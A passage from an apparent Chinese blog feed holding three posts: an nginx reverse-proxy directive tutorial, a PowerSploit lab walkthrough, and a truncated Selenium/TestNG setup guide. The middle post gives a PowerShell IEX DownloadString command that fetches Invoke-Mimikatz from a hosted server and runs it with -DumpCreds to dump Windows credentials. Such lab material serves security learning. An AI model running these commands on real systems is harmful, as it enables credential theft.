&lt;h2&gt;反向代理的基本设置的27个指令&lt;/h2&gt;
&lt;p&gt;学习Nginx服务器的反向代理 服务，要涉及与后端代理服务器相关的配置，是客户端提供正常Web服务的基础，大家应该熟练掌握，尤其是proxy_pass指令，在实际应用过程中需要注意一些配置细节，需要小心使用。&lt;/p&gt;
&lt;h3&gt;1.proxy_pass指令&lt;/h3&gt;
&lt;p&gt;    该指令用来设置被代理服务器的地址，可以是主机名称、IP地址加端口号等形式。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass URL;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　 其中，URL为要设置的被代理服务器的地址，包含传输协议、主机名称或IP地址加商品号、URI等要素。传输协议通常是“http”或者“https”。指令同时还接受以“unix”开始的UNIX-domain套接字路径。例如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass http://www.myweb.name/uri;
proxy_pass http://localhost/uri;
proxy_pass http://unix:/tmp/backend.socket:/uri/;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 如果被代理服务器是一组服务器的话，可以使用upstream指令配置后端服务器组。例如：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
#多个服务器
...
upstream proxy_svrs                  #配置后端服务器
{
    server http://192.168.1.1:8001/uri/;
    server http://192.168.1.2:8001/uri/;
    server http://192.168.1.3:8001/uri/;
}

server
{
    ...
    listen 80;
    server_name www.myweb.name;
    location /
    {
        proxy_pass proxy_svrs;      #使用服务器组名称
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　    这里首先需要提醒大家proxy_pass指令在使用服务器组名称时应该注意一个细节。在上例中，在组内的各个服务器中都指明了传输协议“http://”，而在proxy_pass指令中就不需要指明了。如果 现在将upstream指令的配置改为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
#不指明http
...
upstream proxy_svrs                  #配置后端服务器
{
    server 192.168.1.1:8001/uri/;
    server 192.168.1.2:8001/uri/;
    server 192.168.1.3:8001/uri/;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    我们就需要在proxy_pass指令中指明传输协议“http://”；&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass http://proxy_svrs;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在使用该指令的过程中还需要注意，URL中是否包含有URI，Nginx服务器的处理方式是不同的。如果URL中不包含URI，Nginx服务器不会改变原地址的URI；但是如果包含了URI，Nginx服务器将会使用新的URI替代原来的URI。我们举例来说明。&lt;/p&gt;
&lt;p&gt;请看下面的Nginx配置片段：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
..
server
{
    ...
    server_name www.myweb.name;
    resolver 8.8.8.8;
    listen 82;
    location /server/
    {
        ...
        proxy_pass http://192.168.1.1;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　  如果客户端使用“http://www.myweb.name/server ”发起请求，该请求被配置中显示的location块进行处理，由于proxy_pass指令变量不含有URI，所以转向的地址为“http:///192.168.1.1/server ”；我们再来看下面的Nginx片段：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
..
server
{
    ...
    server_name www.myweb.name;
    resolver 8.8.8.8;
    listen 82;
    location /server/
    {
        ...
        proxy_pass http://192.168.1.1/loc;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在该配置实例中，proxy_pass指令的URI包含了URI“/loc”；如果客户端仍然使用“http://www.myweb.name/server ”发起请求，Nginx服务器将会把地址转向“http://192.168.1.1/loc/ ”；&lt;/p&gt;
&lt;p&gt;    通过上面的实例，我们可以总结 出，在使用proxy_pass指令时，如果不想改变原地址中的URI，就不要在URL变量中配置URI。&lt;/p&gt;
&lt;p&gt;    明白了上面这两个例子的用法，我们来解释大家经常讨论的一个问题，就是proxy_pass指令的URL变量末尾是否加斜杠“/”的问题。&lt;/p&gt;
&lt;p&gt;    请看这两个配置示例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
#配置1 proxy_pass http://192.168.1.1;
#配置2 proxy_pass http://192.168.1.1/;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配置1和配置2的区别在于，配置2中的proxy_pass指令的URL变量末尾添加了斜杠“/”，这意味着配置2中的proxy_pass指令的URL变量包含了URI“/”，而配置1中的proxy_pass指令的URL变量不包含URI。理解了这一点，我们就可以解释下面的实例和现象了。大家注意各例子之间的对比。&lt;/p&gt;
&lt;p&gt;    实例1：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
..
server
{
    ...
    listen 80;
    server_name www.myweb.name;         #注意location的uri变量
    location /
    {
        ...
        #配置1 proxy_pass http://192.168.1.1;
        #配置2 proxy_pass http://192.168.1.1/;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　在该配置中，location块使用“/”作为uri变量的值来匹配不包含URI的请求URL。由于请求URL中不包含URL，因此配置1和配置2的效果是一样的。比如客户端的请求URL为“http://www.myweb.name/index.htm”，其将会被实例1中的location块匹配成功并进行处理。不管使用配置1不是配置2，转向的URL都为：“http://192.168.1.1/index.htm”。&lt;/p&gt;
&lt;p&gt;实例2：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
..
server
{
    ...
    listen 80;
    server_name www.myweb.name;         #注意location的uri变量
    location /server/
    {
        ...
        #配置1 proxy_pass http://192.168.1.1;
        #配置2 proxy_pass http://192.168.1.1/;
    }
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在该配置中，location块使用“/server/”作为uri变量的值来匹配包含的URI“/server/”的请求URL。这时，使用配置1和配置2的转向结果就不相同了。使用配置1和配置2的转向效果就不相同了。使用配置1时候，proxy_pass指令中的URL变量不包含URI，Nginx服务器将不改变原地址的URI，使用配置2的时候，proxy_pass指令中的URL变量包含URI“/”，Nginx服务器会将原地址的URI替换为&quot;/&quot;。&lt;/p&gt;
&lt;p&gt;比如客户端的请求URI为“http://www.myweb.name/server/index.htm”将会被实例2的location块匹配成功并进行处理。使用配置1的时候，转向的URL为“http://192.168.1.1/server/index.htm”，原地址的URI“、server/”示被改变；使用配置2时，转向的URL为“http://192.168.1.1/index.htm”,可以看到原地址的URI“/server/”被替换为“/”。&lt;/p&gt;
&lt;p&gt;大家在应用过程中，一定要注意到该指令在配置上的细节问题，分清楚URL和URI的区别与联系，并能够正确使用它们配置出符合需求的Nginx服务器。&lt;/p&gt;
&lt;h3&gt;&lt;strong&gt;2.proxy_hide_header指令&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt; 该指令用于设置Nginx服务器在发送HTTP响应时，隐藏一些头域信息。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_hide_header field;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，field为需要隐藏的头域。该指令可以在http块、server块或者location块中进行配置。&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;3.proxy_pass_header指令&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;默认情况下，Nginx服务器在发送响应报文时，报文头中不包含“Date”、“Server”、“X-Accel”等来自被代理服务器的头域信息。该指令可以设置这些头域信息以被发送，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass_header field;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;4.proxy_pass_request_body指令&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;该指令用于配置是否将客户端请求的请求体发送给代理服务器，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass_request_body on | off;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认开启（on），开头可以在http块、server块或者location块中进行配置。&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;5.proxy_pass_request_headers指令&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;该指令用于配置是否将客户端请求的请求头发送给代理服务器，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_pass_request_headers  on | off;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认开启（on），开头可以在http块、server块或者location块中进行配置。&lt;/p&gt;
&lt;h3&gt;6.proxy_set_header指令&lt;/h3&gt;
&lt;p&gt;该指令可以理发Nginx服务器接收到的客户端请求的请求头信息，然后将新的请求头发送给被代理的服务器，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_set_header field value;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;field，要更新的信息所在的区域；value，更改的值，支持使用文本、变量或者变量的组合。&lt;/p&gt;
&lt;p&gt;默认情况下，该指令的设置为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_set_header Host $proxy_host;
proxy_set_header Connection close;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 请看一些设置实例：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_set_header Host $http_host;           #将目前Host头域的值填充成客户端的地址
proxy_set_header Host $$host;               #将当前location块的server_name指令填充到Host头域
proxy_set_header Host $$host:$proxy_port;   #listener指令值一起填充到Host头域.
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;7.proxy_set_body指令&lt;/h3&gt;
&lt;p&gt;指该指令可以更改Nginx服务器接收到的客户端请求的请求信息，然后将新的请求体发送给被代理的服务器。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_set_body_value;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　其中，value为更改的信息，支持使用文本、变量或者变量的组合。&lt;/p&gt;
&lt;h3&gt;8.proxy_bind指令&lt;/h3&gt;
&lt;p&gt;官方文档中对该指令的解释是，强制将与代理主机的连接绑定到指定的IP地址。通俗来讲就是，在配置多个基于名称或者基于IP地址。通俗来讲就是，在配置了多个基于名称或者基于IP主机的情况下，如果我们希望代理连接由指定的主机处理，就可以使用该指令进行配置，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_bind adress;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　其中，adress为指定主机的IP地址。 &lt;/p&gt;
&lt;h3&gt;9.proxy_connect_timeout指令&lt;/h3&gt;
&lt;p&gt;该指令配置Nginx服务器与后端被代理服务器尝试建立连接的超时时间，其语法结构为:&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_connect_timeout time;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，time为设置的超时时间，默认60s。&lt;/p&gt;
&lt;h3&gt;10.proxy_read_timeout指令&lt;/h3&gt;
&lt;p&gt;该指令配置Nginx服务器向后端被代理服务器（组）发出的read请求后，等待响应的超时时间，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_read_timeout time;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，time为设置的超时时间，默认60s。&lt;/p&gt;
&lt;h3&gt;11.proxy_send_timeout指令&lt;/h3&gt;
&lt;p&gt;该指令配置Nginx服务器向后端被代理服务器（组）发出的write请求后，等待响应的超时时间，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_write_timeount time
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，time为设置的超时时间，默认60s。&lt;/p&gt;
&lt;h3&gt;12.proxy_http_version指令&lt;/h3&gt;
&lt;p&gt;该指令设置用于Nginx服务器提供代理服务的HTTP协议版本，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_http_version 1.0 |  1.1;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认版本为1.0版本，1.1版本支持upstream服务器组设置的keepalive指令。&lt;/p&gt;
&lt;h3&gt;13.proxy_method指令&lt;/h3&gt;
&lt;p&gt;该指令用于设置Nginx服务器请求被代理服务器时使用的请求方法，一般为POST或者GET。设置了该指令，客户端的请求方法将被忽略。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_method method;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，method的值可以设置为POST或者GET，注意不加引号。&lt;/p&gt;
&lt;h3&gt;14.proxy_ignore_client_abort指令&lt;/h3&gt;
&lt;p&gt;该指令用过设置在客户端中断网络请求时，Nginx服务器是否中断对被代理服务器的请求，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_ignore_client_abort on | off
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;默认设置为off，当客户端中断网络请求时，Nginx服务器中断对被代理服务器的请求。&lt;/p&gt;
&lt;h3&gt;15.proxy_ignore_header指令&lt;/h3&gt;
&lt;p&gt;该指令用于设置一些HTTP响应头的头域，Nginx服务器接收到被代理服务器的响应数据后，不会处理被设置的头域。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_ignore_header field ...;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中,field为要设置的HTTP响应头的头域，例如“X-Accel-Redirect”、“X-Accel-Expires”、“Cache-Control”、“Expires”或“Set-Cookie”等。&lt;/p&gt;
&lt;h3&gt;16.proxy_redirect指令&lt;/h3&gt;
&lt;p&gt;该指令用于修改被代理服务器返回的响应头中的Location头域和“Refresh”头域，与proxy_pass指令配合使用。比如，Nginx服务器通过proxy_pass指令将客户端的请求地址重写为被代理服务器的地址，那么Nginx服务器返回客户端的响应头中“Location”头域显示的地址就应该和客户端发起请求的地址相对应，而不是代理服务器直接返回的地址信息，否则就会出问题。该指令解决了这个问题，可以把代理服务器返回的地址信息更改为需要的地址信息。其语法结构为:&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_redirect redirect replacement
proxy_redirect default;
proxy_redirect off;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;redirect，匹配“Location”头域值的字符串，支持变量的使用和正则表达式。&lt;/p&gt;
&lt;p&gt;replacement，用于替换redirect变量内容的字符串，支持变量的使用。&lt;/p&gt;
&lt;p&gt;该指令的用法我们通过几个配置实例来解释。&lt;/p&gt;
&lt;p&gt;对于第1个结构，假设被代理服务器返回的响应头中的“Location”头域为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
Location: http://localhost:8081/proxy/some/uri
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;该指令设置为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_redirect http://localhost:8081/proxy/ http://myweb/fronted/;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nginx服务器会将“Location”头域信息更改为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
Location：http://myweb/frontend//some/uri;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样，客户端收到的响应信息头部中的“Location”头域就被更改了。&lt;/p&gt;
&lt;p&gt;结构 2使用default，代表使用location块的uri变量作为replacement，并使用proxy_pass变量作为redirect。请看下面两段配置，它们的配置效果是等同的。&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
#配置1 
location /server/
{
    proxy_pass http://proxyserver/source/;
    proxy_redirect default;

}

#配置2
location /server/
{
    proxy_pass http//proxyserver/source/;
    proxy_redirect http://proxyserver/source/ /server/;

}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用结构3可以将当前作用域下所有的proxy_redirect指令全部设置为无效。&lt;/p&gt;
&lt;h3&gt;17.proxy_intercept_errors指令&lt;/h3&gt;
&lt;p&gt;该指令用于配置一个状态是否开启还是关闭。在开启状态时，如果被代理的服务器返回的HTTP状态码为400或者大于400，则Nginx服务器使用自己定义的错误页（使用error_page指令）；如果是关闭状态，Nginx服务器直接将被代理服务器返回的HTTP状态返回给客户端。其请求结构为&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_intercept_errors on | off
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;18.proxy_headers_hash_max_size指令&lt;/h3&gt;
&lt;p&gt;该指令用于配置HTTP报文头哈希表的容量，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_headers_hash_max_size size;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，size为HTTP报文头哈希表的容量上限，默认为512个字符，即：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_headers_hash_max_size 512;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nginx服务器为了能够快速检索HTTP报文头中的各项信息，比如服务器名称、MIME类型、请求头名等，使用哈希表存储这些信息。Nginx服务器在申请存放HTTP报文头的空间时，通常以固定大小为单位申请，该大小由proxy_headers_hash_bucket_size指令配置。&lt;/p&gt;
&lt;p&gt;在Nignx配置中，不仅能够配置整个哈希表的大小上限，对大部分内容项，也可以配置其大小上限，比如server_names_hash_max_size指令和server_names_hash_bucket_size指令用来设置服务器名称的字符数长度。&lt;/p&gt;
&lt;h3&gt;19.proxy_headers_hash_bucket_size指令&lt;/h3&gt;
&lt;p&gt;该指令用于设置Nginx服务器申请存放HTTP报文头的哈希表容量的单位大小。该指令的具体作用在上面proxy_headers_bucket_size指令的使用中已经说明。其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_headers_hash_bucket_size size;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;20.proxy_next_upstream指令&lt;/h3&gt;
&lt;p&gt;在配置Nginx服务器反向代理功能时，如果使用upstream指令配置了一组服务器作为代理 服务器，服务器组中各服务器的访问规则遵循upstream指令配置的轮询规则 ，同时可以使用该指令配置在发生哪些异常情况时，将请求顺次交由下一个组内服务器处理。该指令的语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_next_upstream status ...;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;其中，status为设置的服务器返回状态，可以是一个或者多个。这些状态包括：&lt;/p&gt;
&lt;p&gt;error，建立连接、向被代理服务器发送请求或者读取响应头时服务器发生连接错误。&lt;/p&gt;
&lt;p&gt;timeout，建立连接、向被代理服务器发送请求或者读取响应头时服务器发生连接超时。&lt;/p&gt;
&lt;p&gt;invalid_header，被代理的服务器返回的响应头为空或者无效。&lt;/p&gt;
&lt;p&gt;http_500|http_502|http_503|http_504|http_404，被代理的服务器返回500、502、503、504或者404状态代码。&lt;/p&gt;
&lt;p&gt;off，无法将请求发送给被代理的服务器。&lt;/p&gt;
&lt;p&gt;注意&lt;/p&gt;
&lt;p&gt;与被代理的服务器进行数据传输的过程中发送错误的请求，不包含在该指令支持的状态之内。&lt;/p&gt;
&lt;h3&gt;21.proxy_ssl_session_reuse指令&lt;/h3&gt;
&lt;p&gt;该指令用于配置是否使用基于SSL安全协议的会话连接（“https://”）被代理的服务器，其语法结构为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
proxy_ssl_session_reuse on | off
&lt;/pre&gt;&lt;/div&gt;


</description>
<pubDate>Sun, 24 Feb 2019 15:34:00 +0000</pubDate>
<dc:creator>雪山飞猪</dc:creator>
<og:description>正向代理和反向代理的概念 代理服务（Proxy），通常也称为正向代理服务。 如果把局域网外Internet想象成一个巨大的资源库，那么资源就分布到了Internet的各个点上，局域网内的客户端要访问这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chenqionghe/p/10426084.html</dc:identifier>
</item>
<item>
<title>利用python搭建Powersploit powershell脚本站点 - 雨中落叶</title>
<link>http://www.cnblogs.com/yuzly/p/10428647.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10428647.html</guid>
<description>&lt;p&gt;&lt;span&gt;powershell脚本站点的搭建&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一、Powersploit&lt;/p&gt;
&lt;p&gt;Powersploit是一款基于powershell的后渗透(Post-Exploitation)框架,集成大量渗透相关模块和功能。&lt;/p&gt;
&lt;p&gt;下载powersploit&lt;/p&gt;
&lt;p&gt;github地址: https://github.com/mattifestation/PowerSploit&lt;/p&gt;
&lt;p&gt;二、搭建站点(这里用python自带的web服务,也可以用phpstudy等搭建站点)&lt;/p&gt;
&lt;p&gt;1.实验环境：&lt;/p&gt;
&lt;p&gt;服务端:win7(python3.7)&lt;/p&gt;
&lt;p&gt;客户端:Windows server 2008&lt;/p&gt;
&lt;p&gt;客户端有python环境(用python的web服务),确保客户端能连通服务端&lt;/p&gt;
&lt;p&gt;2.实验步骤:&lt;/p&gt;
&lt;p&gt;&lt;span&gt;服务端:(win7)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1.把下载好的powersploit，解压&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201902/1592114-20190224223858830-1050521278.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;2.安装python,cd到PowerSploit-master目录里面，并开启web服务&lt;/p&gt;
&lt;p&gt;　　python -m http.server 80    #python3.7&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201902/1592114-20190224224039088-131433647.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.本地测试python的web服务是否开启&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201902/1592114-20190224224153987-2115879818.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;客户端:(windows server2008)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;客户端测试:&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201902/1592114-20190224224658944-723846664.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到通过客户端的浏览器访问到搭建的站点了&lt;/p&gt;
&lt;p&gt;下面开始进行powersploit内网渗透神器其中的Invoke-Mimikatz.ps1脚本文件进行举例&lt;/p&gt;
&lt;p&gt;在客户端加载服务端脚本并执行(IEX远程下载脚本执行)&lt;/p&gt;
&lt;p&gt;powershell加载iex(New-Object Net.WebClient).DownloadString('http://192.168.10.4/Exfiltration/Invoke-Mimikatz.ps1”)&lt;/p&gt;
&lt;p&gt; 执行: Invoke-Mimikatz -DumpCreds&lt;/p&gt;
&lt;p&gt;       效果图如下:&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201902/1592114-20190224224850636-702153782.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　从上图可以看到已经获取到本机(windows server2008 的用户名和密码) &lt;/p&gt;
&lt;p&gt;Tips：还有一种可以直接把脚本文件下载下来的方式&lt;/p&gt;
&lt;p&gt;$client=new-object System.Net.WebClient&lt;/p&gt;
&lt;p&gt;$client.DownloadFile(‘http://192.168.8.135/Exfiltration/Invoke-Mimikatz.ps1’,’C://Mimikatz.ps1’)&lt;/p&gt;
&lt;p&gt;也可以直接运行脚本文件来进行内网攻击，但这种方式并不推荐，因为系统出于安全考虑&lt;/p&gt;
&lt;p&gt;powershell默认是不能执行本机上的.ps1文件的，这是因为ps有默认的安全限制&lt;/p&gt;




</description>
<pubDate>Sun, 24 Feb 2019 15:24:00 +0000</pubDate>
<dc:creator>雨中落叶</dc:creator>
<og:description>powershell脚本站点的搭建 一、Powersploit Powersploit是一款基于powershell的后渗透(Post-Exploitation)框架,集成大量渗透相关模块和功能。 下</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuzly/p/10428647.html</dc:identifier>
</item>
<item>
<title>JAVA+SELENIUM+MAVEN+TESTNG框架（二）新建项目 - LuLu泡</title>
<link>http://www.cnblogs.com/muzipaopao/p/10428666.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/muzipaopao/p/10428666.html</guid>
<description>

&lt;p&gt;1.新建maven项目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224225455810-1839408480.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;2.下载selenium的jar包，放入maven依赖库中&lt;/p&gt;
&lt;p&gt;3.新增testng依赖库，build path-&amp;gt;add libirary-&amp;gt;testng&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224225928963-798341309.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224230027083-1690924104.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;4.查看自己电脑的谷歌浏览器版本，寻找对应的chromedriver谷歌浏览器驱动，注意：不同驱动版本支持的浏览器版本不同&lt;/p&gt;
&lt;p&gt;下载对应的chromedriver，并放置到本地的谷歌浏览器安装目录下，如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224230315084-1318138164.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;5.在新建的项目下面，新建一个testng class的java文件，尝试调用驱动打开浏览器&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224230819016-1329408381.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1203965/201902/1203965-20190224230901573-126548995.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 选择新建的testng文件需要包括哪些注解，具体各种注解的使用方法如图&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;18&quot;&gt;&lt;tr&gt;&lt;td&gt;
